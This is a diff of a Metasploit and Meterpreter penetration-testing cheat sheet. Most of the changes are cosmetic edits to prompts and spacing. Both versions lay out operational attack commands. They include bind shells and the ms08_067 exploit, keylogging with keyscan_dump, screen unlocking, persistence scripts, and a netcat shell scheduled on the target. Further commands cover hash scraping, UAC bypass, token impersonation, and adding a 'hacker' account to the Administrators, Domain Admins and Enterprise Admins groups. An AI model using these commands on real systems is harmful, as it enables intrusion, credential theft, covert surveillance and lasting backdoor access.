@@ -42,22 +42,22 @@ Reboot the target system.
 meterpreter >  reboot
 
 Connect to target system - option 1
-nc -vn <targetIP> 4444
+nc -vn <target IP> 4444
 
 Connect to target system - option 2
-msf > use multi/handler
-msf > set payload windows/shell_bind_tcp
-msf > set RHOST <targetIP>
-msf > exploit
+use multi/handler
+set PAYLOAD windows/shell_bind_tcp
+set RHOST <target IP>
+exploit
 
 Example 2
 meterpreter > run metsvc
 Note the port that is used.
-msf > use multi/handler
-msf > set payload windows/metsvc_bind_tcp
-msf > set LPORT <port>
-msf > set RHOST <target IP>
-msf > exploit
+use multi/handler
+set PAYLOAD windows/metsvc_bind_tcp
+set LPORT <port>
+set RHOST <target IP>
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # Phishing
@@ -88,17 +88,17 @@ meterpreter > run arp_scanner -r 10.10.10.1/24
 10.10.10.5
  
 meterpreter > background
-msf > route add 10.10.10.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
-msf > route print
-msf > use auxiliary/scanner/portscan/tcp
-msf > set RHOSTS 10.10.10.2
-msf > set PORTS 1-200
-msf > set THREADS 255
-msf > exploit
-msf > use exploit/windows/smb/ms08_067_netapi
-msf > set RHOST 10.10.10.2
-msf > set PAYLOAD windows/meterpreter/bind_tcp
-msf > exploit
+route add 10.10.10.1 255.255.255.0 x	                   # Where x is the meterpreter session number.
+route print
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.10.10.2
+set PORTS 1-200
+set THREADS 255
+exploit
+use exploit/windows/smb/ms08_067_netapi
+set RHOST 10.10.10.2
+set PAYLOAD windows/meterpreter/bind_tcp
+exploit
 ------------------------------------------------------------------------------------------------------
 
 # psexec
@@ -170,24 +170,24 @@ If upload is successful
      shell                                        Drop into a Windows shell.
      cd \                                         Change to root directory.
 
-idletime                                    
+idletime
      if time < 5 min
      keyscan_start                                Start the keylogger.
-     keyscan_stop                                 Stop the keylogger.
-     keyscan_dump                                 Dump keystrokes.
+     keyscan_stop                                 Stop the keylogger.
+     keyscan_dump                                 Dump keystrokes.
 
 run vnc
-     if the screen is locked exit VNC                               
-     meterpreter > run screen_unlock                    
+     if the screen is locked exit VNC
+     meterpreter > run screen_unlock
 meterpreter > run get_application_list
 meterpreter > run winenum
 
-shell                                             Drop into a Windows shell.
+shell                                             Drop into a Windows shell.
 (from a Windows shell)
-net user                                          Show user accounts.
-net accounts                                      Show password policies.
-net user hacker password /add                     Add a new account called ciphent with the password ciphent.
-net localgroup Administrators hacker /add         Add the new account to the Administrators security group.
+net user                                          Show user accounts.
+net accounts                                      Show password policies.
+net user hacker password /add                     Add a new account called ciphent with the password ciphent.
+net localgroup Administrators hacker /add         Add the new account to the Administrators security group.
 net localgroup administrators
 ipconfig
 [take screen shot]
@@ -293,7 +293,7 @@ set AutoRunScript persistence -r <targetIP> -p 21 -A -X -i 30
 exploit -j -z
 ==========
 
-# shows all the scripts
+# Shows all the scripts
 run [tab]
 ==========
 
@@ -337,6 +337,7 @@ download -r "%USERPROFILE%\\my documents"  ~/
 ==========
 
 # rev shell the hard way
+
 run scheduleme -m 1 -u /tmp/nc.exe -o "-e cmd.exe -L -p 8080"
 ==========
 
@@ -384,9 +385,9 @@ run get_application_list
 run scraper
 =====
 
-root@bt: cd /root/.msf4/logs/scripts/scrapper/<target IP>/
-root@bt: ls
-root@bt: cat hashes.txt
+cd /root/.msf4/logs/scripts/scrapper/<target IP>/
+ls
+cat hashes.txt
 =====
 
 getsystem -t 0
@@ -407,9 +408,9 @@ getsystem
 run post/windows/escalate/bypassuac
 ==========
 
-msf > use auxiliary/gather/dns_bruteforce
-msf > use auxiliary/gather/dns_info
-msf > use auxiliary/gather/dns_reverse_lookup
+use auxiliary/gather/dns_bruteforce
+use auxiliary/gather/dns_info
+use auxiliary/gather/dns_reverse_lookup
 ==========
  
 set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
@@ -422,8 +423,8 @@ use incognito
 list_tokens -u
  
 add_user hacker password -h <target-IP>
-add_localgroup_user Administrators hacker -h <target-IP>
+add_localgroup_user Administrators hacker -h <target IP>
  
-add_group_user "Domain Admins" hacker -h <target-IP>
-add_group_user "Enterprise Admins" hacker -h <target-IP>
+add_group_user "Domain Admins" hacker -h <target IP>
+add_group_user "Enterprise Admins" hacker -h <target IP>
  
